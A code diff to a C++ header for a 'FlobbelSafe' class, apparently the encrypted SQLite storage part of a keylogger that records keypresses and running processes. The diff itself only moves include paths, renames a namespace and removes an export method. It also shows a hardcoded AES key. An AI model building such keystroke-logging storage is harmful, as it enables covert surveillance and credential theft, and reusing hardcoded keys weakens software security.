@@ -11,14 +11,14 @@
 #include <random>
 #include <thread>
 
-#include "osrng.h"
-#include "aes.h"
-#include "modes.h"
-#include "filters.h"
+#include "../dependencies/cryptopp/include/osrng.h"
+#include "../dependencies/cryptopp/include/aes.h"
+#include "../dependencies/cryptopp/include/modes.h"
+#include "../dependencies/cryptopp/include/filters.h"
 
-#include "sqlite3.h"
+#include "../dependencies/sqlite/sqlite3.h"
 
-#include "global_functions.h"
+#include "../FlobbelBackbone/global_functions.h"
 
 static const CryptoPP::byte _key[32] = {
         0xEF,0x46,0x94,0x5A,0x73,0xCE,0x2A,0xCF,
@@ -35,7 +35,7 @@ class FlobbelSafe {
 public:
     explicit FlobbelSafe(std::wstring &_safedir);
     ~FlobbelSafe();
-    void save(const Info& info, Flob_constants::InfoType it);
+    void save(const Info& info, FlobConstants::InfoType it);
 private:
     void add_key(const KeypressInfo &);
     void add_prc(const ProcessInfo &);
@@ -60,7 +60,6 @@ private:
 public:
     void timer();
     void sync();
-    void export_tables();
 private:
     bool end_timer = false;
     std::thread *tmrThread = nullptr;
